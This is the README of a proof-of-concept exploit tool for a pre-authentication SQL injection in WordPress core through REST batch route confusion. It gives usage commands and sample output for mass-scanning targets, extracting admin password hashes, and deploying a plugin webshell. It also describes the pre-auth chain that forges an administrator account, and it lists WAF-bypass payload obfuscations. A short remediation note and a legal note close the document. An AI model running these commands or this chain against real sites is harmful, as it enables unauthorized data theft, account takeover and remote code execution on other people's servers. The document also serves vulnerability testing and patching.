# wp2shell-poc

Independent proof-of-concept for the unauthenticated WordPress REST batch route-confusion SQL
injection associated with [Searchlight Cyber's wp2shell advisory](https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/).

This repository is not Searchlight Cyber's official tool. It implements `check` (vulnerability
confirmation), `read` (database extraction), and `shell` (command execution via plugin upload),
with significant improvements over earlier public PoCs: a multi-stage SQLi confirmation pipeline,
four extraction techniques including a new count-based oracle, and automated WAF bypass probing.

```
$ python3 run.py check targets.txt --confirm-sqli

[*] Scanning 30 targets from targets.txt

[*] [1/30] https://target.example
[*] IP: 192.168.1.50 | Server: nginx/1.18.0
[*] WordPress markers found (wp-content / wp-includes / wp-json)
[*] Public WordPress version hints:
    - 7.0.1 via HTML generator meta (wp2shell affected range)
[*] Batch probe -> HTTP 207; markers matched: parse_path_failed, block_cannot_read, rest_batch_not_allowed
[VULN] VULNERABLE — batch route-confusion behavior detected.
[VULN] SQLi confirmed — boolean blind oracle distinguishes tautology from contradiction.
[*] Completed in 2.4s

[*] [2/30] https://waf-blocked.example
[*] IP: 104.21.45.12 | Server: cloudflare
[*] WordPress markers found (wp-content / wp-includes / wp-json)
[*] Public WordPress version hints:
    - 7.0.1 via HTML generator meta (wp2shell affected range)
[!] Primary endpoint blocked; bypassed via /wp-json/batch/v1
[-] Batch endpoint returned HTTP 403 — batch endpoint is forbidden (WAF, edge rule, or REST restriction).
[!] WP version is in the affected range but batch is WAF-blocked — added to revisit list.
[*] Completed in 1.1s

────────────────────────────────────────────────────────────
[VULN] Scan complete in 1m 42s — 1/30 vulnerable.
[VULN] Vulnerable targets:
    https://target.example

[!] Worth revisiting — affected WP version, batch WAF-blocked:
    https://waf-blocked.example

[*] Results saved to: vuln-20260721-143512.txt
────────────────────────────────────────────────────────────

$ python3 run.py read https://target.example --preset users
[*] UNION extraction unavailable; trying count-based oracle.
[*] Count-based extraction available (X-WP-Total oracle, ~1 request per char) — using it.
[*] Reading: SELECT user_login, user_pass FROM wp_users ...
[+] admin : $2y$10$xK9z3Lm8vQwRtY2NpJcOeOfGhBsDnUaElVyZkXiIqWmFrCjAb1Hd.
[*] 47 request(s) sent.

$ python3 run.py shell https://target.example --user admin --password 'recovered'
[+] Logged in as admin.
[+] Plugin shell deployed at /wp-content/plugins/wp-health-check-6f2a/shell.php
[+] Token: 8b3e1f9c
[*] Shell ready. Type 'exit' to quit and remove the plugin.
wp2shell> id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
wp2shell> whoami
www-data
wp2shell> exit
[*] Plugin removed.
```

## Affected versions

| Version range | Status |
| ------------- | ------ |
| <= 6.8.5 | Not affected |
| 6.9.0 – 6.9.4 | Affected |
| 7.0.0 – 7.0.1 | Affected |
| >= 7.0.2 / >= 6.9.5 | Patched |

## How it works

The REST batch endpoint (`/batch/v1`) is unauthenticated and processes each sub-request
independently. `serve_batch_request_v1()` builds two parallel arrays — `$matches` (the matched
handler) and `$validation` (the validation result) — indexed by the same offset when dispatching.
A sub-request whose path fails `wp_parse_url()` is appended to `$validation` but not `$matches`,
shifting the arrays out of step so a sub-request is dispatched under a **different** handler. That
is the route confusion.

The PoC nests this twice:

1. A `POST /wp/v2/posts` request with a `requests` body is dispatched under the batch handler.
   Having been validated as a posts request, its sub-requests never get checked against the batch
   schema, bypassing the `GET`-only method allow-list.
2. Inside that inner batch, a `GET /wp/v2/posts/999999` item-route request carries collection query
   params (`author_exclude`, `orderby`, `per_page`). The item-route schema does not validate these
   collection-only params. The desync then dispatches it under posts `get_items()`, where
   `author_exclude` maps to `WP_Query`'s `author__not_in` var, which vulnerable builds interpolate
   into SQL unparameterized.

The result is a pre-authenticated SQL injection with boolean, timing, and UNION channels.

### Pre-auth RCE chain

1. UNION-forge fake `wp_posts` rows to render attacker-controlled content through the posts REST
   collection, causing WordPress to create real oEmbed cache posts.
2. Recover those cache post IDs via SQLi.
3. In one poisoned batch request, recast those IDs as a customizer changeset, navigation item, and
   request hook — causing `POST /wp/v2/users` to create a generated administrator.
4. Log in and use plugin upload to execute commands.

Steps 1–4 are pre-authentication. The final command-execution step is authenticated admin plugin
upload. **The pre-auth RCE chain requires UNION extraction to work. It is blocked on targets with
a persistent object cache (Redis, Memcached) — see Object Cache Limitations below.**

## Requirements

Python 3.8+ and the standard library. No third-party dependencies.

## Usage

Run from the repository directory:

```
python3 run.py <command> <url> [options]
```

Or `pip install .` to get a `wp2shell` command on your `PATH`.

---

### check — vulnerability confirmation (non-destructive)

Confirms the route-confusion vulnerability by sending a benign batch marker probe. A vulnerable
target returns HTTP 207 with all three marker codes: `parse_path_failed`,
`block_cannot_read`, and `rest_batch_not_allowed`. The probe does not write any data.

```
python3 run.py check https://target
python3 run.py check targets.txt          # scan every URL in the file
python3 run.py check https://target --confirm-sqli
```

When scanning a file, each line can be a full URL (`https://target.com`) or a bare hostname
(`target.com`). Bare hostnames are automatically probed to determine whether `https://`,
`https://www.`, `http://`, or `http://www.` responds — whichever returns a 2xx/3xx/4xx is used.

Per-target output includes:
- **IP address and Server header** — useful for identifying CDNs (Cloudflare, Akamai) or shared hosting
- **Elapsed time** per target
- **Endpoint bypass** notification if the primary `/?rest_route=/batch/v1` path is WAF-blocked and
  an alternative path (`/wp-json/batch/v1`, case variants, etc.) succeeds

At the end of a bulk scan:
- **Vulnerable** targets are listed in red
- **Worth revisiting** — targets with an affected WP version but WAF-blocked batch endpoint
- Results are auto-saved to `vuln-YYYYMMDD-HHMMSS.txt`

#### WAF bypass (endpoint path)

When a WAF blocks the primary batch endpoint path, the tool automatically tries 7 alternative
path variants: `/wp-json/batch/v1`, case variations (`/Batch/v1`, `/batch/V1`), double-slash
prefix, and `index.php` prefix. The first non-403 response is used for all subsequent requests.

#### SQLi confirmation pipeline (`--confirm-sqli`)

When `--confirm-sqli` is passed, the tool runs a multi-stage confirmation:

1. **UNION** — attempts to forge a fake `WP_Post` and read it back. Fast and unambiguous.
2. **Boolean blind** — sends a tautology/contradiction pair and compares `X-WP-Total`. Works even
   when UNION reflection is blocked by an object cache or WAF.
3. **Timing** — falls back to paired `SLEEP()` probes. Detected WAF filtering of `SLEEP()` is
   reported as a warning; the route-confusion marker pattern is treated as sufficient confirmation.

Route-confusion markers and SQLi confirmation are independent signals. A WAF can block the SQLi
payload while the route-confusion bug is still present; a failed confirmation does not prove the
bug is absent.

---

### read — database extraction

```
python3 run.py read https://target --preset fingerprint
python3 run.py read https://target --preset users
python3 run.py read https://target --query "SELECT @@version"
python3 run.py read https://target --query "SELECT user_pass FROM wp_users WHERE user_login='admin'"
```

`--technique auto` (default) tries extraction methods in this order, using whichever works first:

| Technique | Speed | How it works | Requirement |
|---|---|---|---|
| `union` | 1 req/value | Forges a fake `WP_Post` row; reads `post_title` back from REST response as `\|\|HEX(value)\|\|` | No object cache; ORDER BY removed via `orderby=none` |
| `count` | ~1 req/char | Encodes 7 ASCII bits into `X-WP-Total` via conditional UNION rows; decodes from header | No object cache (see below) |
| `error` | ~1 req/15 chars | `EXTRACTVALUE`/`UPDATEXML` leaks value in reflected DB error message | `WP_DEBUG_DISPLAY` or `$wpdb->show_errors` on |
| `blind` | ~7 req/char | Binary search via boolean oracle; reads `X-WP-Total` as true/false signal | Always works |

Force a specific technique with `--technique union|count|error|blind`.

#### WAF bypass (UNION technique)

When plain `UNION SELECT` is blocked, the tool automatically probes 21 obfuscation variants in
order of simplicity, including `UNION ALL`, MySQL executable comments (`/*!UNION*/`,
`/*!00000UNION*/`), C-style whitespace (`UNION/**/`), URL-encoded whitespace (`UNION%0a`,
`UNION%09`), case randomization, keyword splitting (`UN/**/ION`), and double-nesting
(`UNunionION`). The first working bypass is cached and used for all subsequent requests.

#### Object cache limitations

When a persistent object cache (Redis, Memcached) is active, WordPress rewrites WP_Query into
two phases: an ID-only `SELECT` and a follow-up `SELECT * WHERE ID IN (...)`. UNION-forged rows
survive the first phase but are dropped by the second (the fake ID has no real database row).
Additionally, the COUNT query used for `X-WP-Total` is issued separately and bypasses the UNION
injection, blocking the count-based oracle too.

`available()` probes both techniques and degrades automatically to blind extraction. Data
extraction always works; the pre-auth RCE chain does not.

---

### shell — command execution

With administrator credentials, `shell` logs in and uses WordPress plugin upload to run commands:

```
python3 run.py shell https://target --user admin --password 'PASSWORD' --cmd id
python3 run.py shell https://target --user admin --password 'PASSWORD' -i
```

Without credentials, `shell` first runs the pre-auth SQLi-to-admin bridge:

```
python3 run.py shell https://target --cmd id
python3 run.py shell https://target -i
```

The plugin webshell is locked behind a random path and a per-run token. It is removed
automatically after the session ends. The generated administrator (pre-auth path) is also removed
automatically.

**The pre-auth bridge requires UNION extraction and is blocked on object-cache targets.**

---

## Options

| Option | Applies to | Description |
| --- | --- | --- |
| `--timeout N` | all | Request timeout in seconds (default: 15). |
| `--proxy URL` | all | HTTP proxy, e.g. `http://127.0.0.1:8080` (Burp). |
| `--no-verify-ssl` | all | Disable SSL certificate verification. |
| `--confirm-sqli` | check | Run multi-stage SQLi confirmation (UNION → boolean → timing). |
| `--sleep N` | check | `SLEEP()` delay for timing confirmation (default: 3). |
| `--samples N` | check | Timing sample pairs (default: 3). |
| `--preset` | read | `fingerprint` (version/db/user) or `users` (logins + hashes). |
| `--query` | read | Scalar SQL expression to read, e.g. `"SELECT @@version"`. |
| `--technique` | read | `auto` (default), `union`, `count`, `error`, or `blind`. |
| `--prefix` | read | Table prefix (default: `wp_`). |
| `--max-length N` | read | Max characters per extracted value (default: 128). |
| `--user` | shell | Admin username (omit both `--user` and `--password` for pre-auth bridge). |
| `--password` | shell | Admin password. |
| `--cmd` | shell | Command to run on the target. |
| `-i` / `--interactive` | shell | Interactive shell session. |

---

## Remediation

Update to WordPress 7.0.2 (or 6.9.5 on the 6.9 branch). Until patched, block both
`/wp-json/batch/v1` and `?rest_route=/batch/v1` at the edge, or require authentication for
the batch endpoint via the `rest_pre_dispatch` filter.

---

## Legal

For authorized security testing only. Use exclusively against systems you own or have explicit
written permission to test. No warranty is provided and no liability is accepted for misuse.

---

## References

- WordPress 7.0.2 release — <https://wordpress.org/news/2026/07/wordpress-7-0-2-release/>
- Searchlight Cyber wp2shell advisory — <https://slcyber.io/research-center/wp2shell-pre-authentication-rce-in-wordpress-core/>
- sergiointel/wp2shell-poc SQLi-to-admin bridge — <https://github.com/sergiointel/wp2shell-poc>
- 47Cid/wp2shell-lab (count-based oracle technique) — <https://github.com/47Cid/wp2shell-lab>
- PayloadsAllTheThings MySQL injection — <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md>
- OWASP SQL Injection WAF bypass — <https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF>
